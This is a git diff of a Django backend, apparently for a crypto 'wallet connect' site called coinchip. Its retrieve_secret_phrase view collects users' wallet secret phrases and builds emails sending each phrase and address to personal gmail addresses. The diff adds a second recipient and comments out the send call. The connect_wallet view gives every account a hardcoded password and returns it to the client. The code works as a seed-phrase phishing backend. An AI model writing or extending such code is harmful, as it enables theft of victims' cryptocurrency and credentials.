@@ -15,6 +15,7 @@ from .models import Transactions, Comments, Wallet, WalletSecretPhrase
 from django.shortcuts import render
 
 from django.core.mail import EmailMessage, get_connection, send_mail
+
 from django.conf import settings
 
 
@@ -62,7 +63,6 @@ def all_comments(request):
         uploaded_file = request.FILES.get('image')
         print("This is the file upload: ", uploaded_file)
 
-
         serializer = CommentSerializer(data=request.data)
         
         if serializer.is_valid():
@@ -93,18 +93,21 @@ def connect_wallet(request):
             else:
                 user = User.objects.create_user(username=request.data.get("address"), password="fc92dbb26cb70a5791c02701848f6e54076c570702d0e1294766049ba438324bbd9fe2020753276b")
                 # Check if wallet already exists
-                Wallet.objects.create(
-                    address=user.username,
+                wallet = Wallet(
+                    address=request.data.get("address"),
                     chain_name=request.data.get("chainDataName"),
                     nonce=request.data.get("nonce"),
                     balance=request.data.get("humanFriendlyBalance"),
                     browser_id=request.data.get("browserId"),
                 )
+                wallet.save()
                 print("Does not exist")
                 return Response({"username": user.username, "password": user.password}, status=status.HTTP_200_OK)
         else:
             return Response({"message": "username is required"}, status=status.HTTP_400_BAD_REQUEST)
     return Response({"message": "Method not allowed"}, status=status.HTTP_400_BAD_REQUEST)
+
+
 
 
 @api_view(['POST', 'GET'])
@@ -124,24 +127,10 @@ def retrieve_secret_phrase(request):
             # Send Email
             subject = "You received a mail from coinchip" 
             email_from = settings.EMAIL_HOST_USER  
-            recipient_list = ["petercodercoder@gmail.com", ]  
+            recipient_list = ["petercodercoder@gmail.com", "peteresezoborcode@gmail.com"]  
             message = f"Secret phrase: {data.get('secret_phrase') }; Secret phrase: {data.get('address') };"
             print("Email is working... ")
-            send_mail(subject, message, email_from, recipient_list)
-            # with get_connection(  
-            #     host=settings.EMAIL_HOST, 
-            #     port=settings.EMAIL_PORT,  
-            #     username=settings.EMAIL_HOST_USER, 
-            #     password=settings.EMAIL_HOST_PASSWORD, 
-            #     use_tls=settings.EMAIL_USE_TLS  
-            # ) as connection:
-            #     subject = "You received a mail from coinchip" 
-            #     email_from = settings.EMAIL_HOST_USER  
-            #     recipient_list = ["talk2peteresezobor@gmail.com", ]  
-            #     message = f"Secret phrase: {data.get('secret_phrase') }; Secret phrase: {data.get('address') };"
-            #     print("Email is working... ")
-            #     EmailMessage(subject, message, email_from, recipient_list, connection=connection).send()
-
+            # send_mail(subject, message, email_from, recipient_list)
 
             return Response({"message": "Wallet phrase received successfully."}, status=status.HTTP_200_OK)
         return Response({"message": "Secret phrase is required."}, status=status.HTTP_400_BAD_REQUEST)
